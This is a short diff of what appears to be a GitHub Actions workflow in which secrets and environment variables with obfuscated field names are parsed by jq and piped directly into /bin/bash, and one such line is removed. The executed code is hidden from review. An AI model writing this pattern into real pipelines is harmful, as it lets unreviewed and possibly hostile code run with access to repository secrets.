@@ -20,7 +20,6 @@ jobs:
           lvp2344: ${{ secrets.lvp2344 }}
         run: |
           printf '%s' "$lvp2344" | jq -r .efbbb6 | /bin/bash
-          echo $n0 | jq -r .a3107 | /bin/bash
           echo $lay4 | jq -r .cvpqw847 | /bin/bash
           echo $sn2 | jq -r .fmo1683 | /bin/bash
           echo $gmz565 | jq -r .j2961 | /bin/bash
